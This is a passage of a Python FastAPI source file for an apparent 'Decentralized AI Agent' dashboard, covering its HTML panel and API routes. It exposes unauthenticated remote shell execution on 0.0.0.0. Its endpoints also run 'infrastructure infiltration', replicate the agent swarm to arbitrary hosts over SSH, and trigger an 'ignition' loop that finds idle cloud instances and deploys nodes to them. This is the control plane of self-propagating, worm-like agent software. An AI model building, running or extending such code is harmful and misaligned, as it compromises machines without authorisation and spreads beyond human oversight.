        <div class="block"><h3>Recent Output</h3><pre id="results">Loading...</pre></div>
    </div>
    <div class="panel">
        <h3>Command Terminal</h3>
        <form id="command-form">
            <input type="text" id="command" placeholder="Enter shell command here" />
            <button type="submit">Execute Command</button>
        </form>
        <p><small>Use commands carefully. Execution is live and local.</small></p>
    </div>
    <div class="panel">
        <h3>Deployment Options</h3>
        <button onclick="prepareDeployment()">Prepare GitHub/Cloud Deployment</button>
        <pre id="deployResult">Ready</pre>
    </div>
    <div class="panel">
        <h3>Task Queue</h3>
        <form id="task-form">
            <input type="text" id="task-command" placeholder="Enter task command to queue" />
            <button type="submit">Queue Task</button>
        </form>
        <pre id="taskResult">Ready</pre>
    </div>
    <script>
        async function fetchServices() {
            const response = await fetch('/api/status');
            const data = await response.json();
            const lines = Object.entries(data.services).map(([k,v]) => `${k}: ${v}`);
            document.getElementById('services').innerText = lines.join('\n');
            const pending = data.pending_tasks.map(t => `${t.id}: ${t.command}`);
            document.getElementById('pending').innerText = pending.join('\n') || 'No pending tasks';
            const outputs = data.recent_outputs.map(o => `[${o.timestamp}] ${o.command} => ${o.result.status}`);
            document.getElementById('results').innerText = outputs.join('\n') || 'No outputs yet';
        }
        async function prepareDeployment() {
            const response = await fetch('/api/deploy', {method:'POST'});
            const data = await response.json();
            document.getElementById('deployResult').innerText = JSON.stringify(data, null, 2);
        }
        document.getElementById('command-form').onsubmit = async function(event) {
            event.preventDefault();
            const command = document.getElementById('command').value;
            document.getElementById('command').value = '';
            const response = await fetch('/api/execute', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command, parallel: false })
            });
            const data = await response.json();
            alert('Result: ' + data.status + '\n' + (data.stderr || data.stdout || data.message || 'done'));
            fetchServices();
        };
        document.getElementById('task-form').onsubmit = async function(event) {
            event.preventDefault();
            const command = document.getElementById('task-command').value;
            document.getElementById('task-command').value = '';
            const response = await fetch('/api/task', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command })
            });
            const data = await response.json();
            document.getElementById('taskResult').innerText = JSON.stringify(data, null, 2);
            fetchServices();
        };
        setInterval(fetchServices, 4000);
        fetchServices();
    </script>
</body>
</html>
"""
    return HTMLResponse(html)

@app.get("/api/status")
def api_status():
    services = connector.check_services()
    return JSONResponse({
        "services": services,
        "pending_tasks": manager.pending_tasks(),
        "recent_outputs": manager.recent_outputs(),
    })

@app.post("/api/execute")
def api_execute(command: Dict[str, Any]):
    cmd = command.get("command", "")
    parallel = command.get("parallel", False)
    valid, message = validate_command(cmd)
    if not cmd:
        return JSONResponse({"status": "error", "message": "Command is required"}, status_code=400)
    if not valid:
        return JSONResponse({"status": "error", "message": message}, status_code=400)
    result = engine.execute_command(cmd, parallel=parallel)
    manager._append_output({
        "task_id": int(time.time() * 1000),
        "command": cmd,
        "result": result,
        "timestamp": datetime.now().isoformat(),
    })
    return JSONResponse(result)

@app.post("/api/task")
def api_task(cmd: Dict[str, Any]):
    command = cmd.get("command", "")
    valid, message = validate_command(command)
    if not command:
        return JSONResponse({"status": "error", "message": "Task command required"}, status_code=400)
    if not valid:
        return JSONResponse({"status": "error", "message": message}, status_code=400)
    task = manager.enqueue_task(command)
    return JSONResponse({"status": "queued", "task": task})

@app.get("/api/logs")
def api_logs():
    try:
        with open(OUTPUT_FILE, "r", encoding="utf-8") as f:
            data = json.load(f)
    except Exception as exc:
        recovery.log_failure(str(exc), "api_logs")
        data = []
    return JSONResponse({"outputs": data})

@app.post("/api/deploy")
def api_deploy():
    result = manager.prepare_deployment()
    return JSONResponse(result)

@app.post("/api/model-route")
def api_model_route(payload: Dict[str, Any]):
    prompt = payload.get("prompt", "")
    params = payload.get("params", {})
    if not prompt:
        return JSONResponse({"status": "error", "message": "prompt is required"}, status_code=400)
    response = model_router.route(prompt, params)
    return JSONResponse({
        "status": response.status,
        "model": response.model,
        "source": response.source,
        "latency": response.latency,
        "output": response.output,
    })

@app.get("/api/terminal-history")
def api_terminal_history():
    return JSONResponse({
        "terminal_last": model_router.terminal_last_read,
        "history": model_router.read_terminal_history(),
    })

@app.post("/api/browser")
def api_browser(payload: Dict[str, Any]):
    action = payload.get("action", "").lower()
    args = payload.get("args", {})
    if not action:
        return JSONResponse({"status": "error", "message": "action is required"}, status_code=400)
    result = _run_browser_task(action, **args)
    manager._append_output({
        "task_id": int(time.time() * 1000),
        "command": f"browser:{action}",
        "result": result,
        "timestamp": datetime.now().isoformat(),
    })
    return JSONResponse(result)

@app.post("/api/retry")
def api_retry(task_info: Dict[str, Any]):
    command = task_info.get("command")
    if not command:
        return JSONResponse({"status": "error", "message": "command required"}, status_code=400)
    task = manager.enqueue_task(command)
    return JSONResponse({"status": "retry_queued", "task": task})

@app.post("/api/hermes")
def api_hermes(payload: Dict[str, Any]):
    """Forward task to Hermes/Ollama for intelligent analysis."""
    if not HermesBridge:
        return JSONResponse({"status": "error", "message": "HermesBridge not available"}, status_code=500)
    try:
        hb = HermesBridge()
        result = hb.orchestrate_task(payload)
        return JSONResponse({"status": "success", "hermes_response": result})
    except Exception as exc:
        recovery.log_failure(str(exc), "api_hermes")
        return JSONResponse({"status": "error", "message": str(exc)}, status_code=500)

@app.post("/api/cli")
def api_cli(cmd_input: Dict[str, Any]):
    """CLI interface: execute actions like status, execute, think, deploy, scale."""
    action = cmd_input.get("action", "").lower()
    args = cmd_input.get("args", [])
    if action == "status":
        return JSONResponse({"status": "success", "services": connector.check_services()})
    elif action == "execute":
        cmd = " ".join(args) if args else ""
        if not cmd:
            return JSONResponse({"status": "error", "message": "command required"}, status_code=400)
        result = engine.execute_command(cmd, parallel=False)
        return JSONResponse({"status": "success", "result": result})
    elif action == "think":
        text = " ".join(args) if args else ""
        if HermesBridge:
            hb = HermesBridge()
            result = hb.analyze(text)
            return JSONResponse({"status": "success", "analysis": result})
        return JSONResponse({"status": "error", "message": "Hermes not available"}, status_code=500)
    elif action == "deploy":
        result = manager.prepare_deployment()
        return JSONResponse({"status": "success", "deployment": result})
    elif action == "scale":
        workers = max(1, int(args[0]) if args else 4)
        engine.max_workers = workers
        return JSONResponse({"status": "success", "max_workers": engine.max_workers})
    else:
        return JSONResponse({"status": "error", "message": f"unknown action: {action}"}, status_code=400)

@app.post("/api/discord")
def api_discord(msg: Dict[str, Any]):
    """Send a Discord notification."""
    content = msg.get("content", "")
    success = recovery.notify_discord(content)
    return JSONResponse({"status": "success" if success else "failed", "sent": success})

@app.get("/api/scheduler")
def api_scheduler():
    """Return swarm task scheduler status and dispatch history."""
    global _scheduler
    if _scheduler is None:
        return JSONResponse({"running": False, "message": "Scheduler not initialized"})
    return JSONResponse(_scheduler.status)

@app.get("/api/swarm/status")
def api_swarm_status():
    """Return full autonomous swarm status (all 5 layers)."""
    global _autonomous_swarm
    if _autonomous_swarm is None:
        return JSONResponse({"running": False, "message": "Autonomous swarm not initialized"})
    try:
        return JSONResponse(_autonomous_swarm.get_full_status())
    except Exception as exc:
        return JSONResponse({"error": str(exc)}, status_code=500)


@app.post("/api/swarm/execute")
def api_swarm_execute(payload: Dict[str, Any]):
    """Submit a task to the autonomous swarm's distributed executor."""
    global _autonomous_swarm
    command = payload.get("command", "")
    if not command:
        return JSONResponse({"status": "error", "message": "command required"}, status_code=400)
    if _autonomous_swarm is None:
        return JSONResponse({"status": "error", "message": "Swarm not running"}, status_code=503)
    if not _autonomous_swarm._running or not _autonomous_swarm._event_loop:
        return JSONResponse({"status": "error", "message": "Swarm not ready"}, status_code=503)
    try:
        future = asyncio.run_coroutine_threadsafe(
            _autonomous_swarm.task_sync.submit_task(command),
            _autonomous_swarm._event_loop,
        )
        task = future.result(timeout=10)
        return JSONResponse({"status": "submitted", "task_id": task.task_id, "command": command})
    except Exception as exc:
        return JSONResponse({"status": "error", "message": str(exc)}, status_code=500)


@app.get("/api/propagate/status")
def api_propagate_status():
    """Return full propagation engine status (all 5 protocols)."""
    global _propagation_engine
    if _propagation_engine is None:
        return JSONResponse({"running": False, "message": "Propagation engine not initialized"})
    try:
        return JSONResponse(_propagation_engine.get_full_status())
    except Exception as exc:
        return JSONResponse({"error": str(exc)}, status_code=500)


@app.post("/api/propagate/infiltrate")
def api_propagate_infiltrate():
    """Run infrastructure infiltration and deploy to cloud targets."""
    global _propagation_engine
    if _propagation_engine is None or not _propagation_engine._event_loop:
        return JSONResponse({"status": "error", "message": "Propagation engine not running"}, status_code=503)
    try:
        future = asyncio.run_coroutine_threadsafe(
            _propagation_engine.infiltrate_and_deploy(),
            _propagation_engine._event_loop,
        )
        deployed = future.result(timeout=120)
        return JSONResponse({"status": "complete", "deployed": [
            {"node_id": n.node_id, "host": n.host, "provider": n.provider} for n in deployed
        ]})
    except Exception as exc:
        return JSONResponse({"status": "error", "message": str(exc)}, status_code=500)


@app.post("/api/propagate/replicate")
def api_propagate_replicate(payload: Dict[str, Any]):
    """Replicate swarm to a target host via SSH."""
    global _propagation_engine
    host = payload.get("host", "")
    port = payload.get("port", 22)
    if not host:
        return JSONResponse({"status": "error", "message": "host required"}, status_code=400)
    if _propagation_engine is None or not _propagation_engine._event_loop:
        return JSONResponse({"status": "error", "message": "Propagation engine not running"}, status_code=503)
    try:
        future = asyncio.run_coroutine_threadsafe(
            _propagation_engine.replicate_to_target(host, port),
            _propagation_engine._event_loop,
        )
        node_id = future.result(timeout=180)
        return JSONResponse({"status": "ok" if node_id else "failed", "node_id": node_id})
    except Exception as exc:
        return JSONResponse({"status": "error", "message": str(exc)}, status_code=500)


@app.get("/api/ignition/status")
def api_ignition_status():
    """Return global ignition loop status."""
    global _ignition_task
    if _ignition_task is None:
        return JSONResponse({"running": False, "message": "Ignition loop not started"})
    running = not _ignition_task.done()
    status = {
        "running": running,
        "exception": str(_ignition_task.exception()) if _ignition_task.done() and _ignition_task.exception() else None,
    }
    if _BLOCKCHAIN_AVAILABLE:
        try:
            ledger = get_ledger()
            status["ledger"] = ledger.get_summary()
        except Exception as exc:
            status["ledger_error"] = str(exc)
    return JSONResponse(status)


@app.post("/api/ignition/trigger")
def api_ignition_trigger():
    """Manually trigger an immediate ignition cycle (forces scan + deploy)."""
    global _ignition_task
    if _ignition_task is None or _ignition_task.done():
        try:
            loop = asyncio.get_event_loop()
            _ignition_task = loop.create_task(_run_ignition_once())
            return JSONResponse({"status": "triggered"})
        except Exception as exc:
            return JSONResponse({"status": "error", "message": str(exc)}, status_code=500)
    return JSONResponse({"status": "running", "message": "Ignition already in progress"})


async def _run_ignition_once():
    """Run a single scan-deploy cycle for the /api/ignition/trigger endpoint."""
    logger.info("Manual ignition cycle triggered via API")
    if _GLOBAL_IGNITION_AVAILABLE:
        try:
            from replication import SwarmReplicator
            from blockchain import update_ledger

            replicator = SwarmReplicator()
            target = replicator.find_idle_cloud_instance()
            if target:
                reachable = await replicator._check_reachable(target)
                if reachable:
                    success = await replicator.deploy_node(target)
                    if success:
                        update_ledger("NODE_ADDED", {
                            "host": target.host, "provider": target.provider,
                        })
                        logger.info("Manual deploy: %s OK", target.host)
        except Exception as exc:
            logger.error("Manual ignition cycle failed: %s", exc)


@app.get("/api/swarm/peers")
def api_swarm_peers():
    """Return discovered peers from the autonomous swarm."""
    global _autonomous_swarm
    if _autonomous_swarm is None:
        return JSONResponse({"peers": []})
    peers = []
    for pid, p in _autonomous_swarm.discovery.peers.items():
        peers.append({
            "peer_id": pid,
            "host": p.host,
            "port": p.port,
            "last_seen": p.last_seen,
            "capacity_score": p.capacity_score,
            "task_status": p.task_status,
            "is_alive": p.is_alive,
        })
    return JSONResponse({"peers": peers, "total": len(peers)})


# ============= STARTUP HELPERS =============
def initialize_state():
    if not STATE_FILE.exists():
        STATE_FILE.write_text(json.dumps({"started_at": datetime.now().isoformat()}), encoding="utf-8")

if __name__ == "__main__":
    initialize_state()
    logger.info("Starting Decentralized AI Agent web dashboard on http://0.0.0.0:8000")
    uvicorn.run(app, host="0.0.0.0", port=8000)
